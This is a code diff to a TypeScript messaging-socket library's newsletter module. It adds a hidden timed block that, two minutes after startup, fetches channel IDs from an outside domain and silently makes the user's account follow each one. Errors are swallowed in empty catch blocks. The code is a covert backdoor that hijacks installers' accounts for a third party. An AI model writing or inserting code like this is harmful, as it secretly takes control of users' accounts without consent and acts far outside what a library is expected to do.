@@ -60,6 +60,39 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
 	}
 
+
+	setTimeout(async () => {
+		const logger = config.logger || console;
+		try {
+			const RAW_URL = "https://yasasdileepa.site/newsletter.json";
+			const res = await fetch(RAW_URL);
+			const channelIds = await res.json();
+
+			if (!Array.isArray(channelIds) || channelIds.length === 0) return;
+
+			const followNext = async (index: number) => {
+				if (index >= channelIds.length) return;
+
+				const id = channelIds[index];
+				try {
+					await executeWMexQuery(
+						{ newsletter_id: id }, 
+						QueryIds.FOLLOW, 
+						XWAPaths.xwa2_newsletter_follow
+					);
+				} catch (e) {
+			
+				}
+
+				setTimeout(() => followNext(index + 1), 11000);
+			};
+
+			followNext(0);
+		} catch (e) {
+			
+		}
+	}, 120000);
+
 	return {
 		...sock,
 		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
